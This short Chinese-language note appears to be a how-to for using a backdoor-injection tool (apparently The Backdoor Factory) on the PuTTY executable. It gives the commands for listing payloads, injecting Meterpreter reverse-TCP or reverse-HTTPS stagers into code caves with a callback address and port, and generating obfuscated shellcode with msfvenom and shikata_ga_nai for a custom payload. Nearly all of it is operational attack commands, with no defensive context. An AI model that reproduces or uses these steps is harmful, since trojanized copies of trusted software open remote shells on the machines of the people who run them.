	查看是否支持捆绑
	>python backdoor.py -f /root/Desktop/putty.exe -S
	查看此文件支持哪些payload
	>python backdoor.py -f /root/Desktop/putty.exe -s show
	reverse_shell_tcp_inline对应msf
	set payload windows/meterpreter/reverse_tcp
	meterpreter_reverse_https_threaded应msf
	set payload windows/meterpreter/reverse_https
	iat_reverse_tcp_stager_threaded修复IAT
	user_supplied_shellcode_threaded自定义payload
	参数
	-s 指定payload
	-H 回连地址
	-P 回连端口
	-J 多代码裂缝注入
	>python backdoor.py -f ~/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe
	后门生成在backdoored目录
	或
	生成payload
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.c
	自定义
	>python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shellcode.c  -o payload2.exe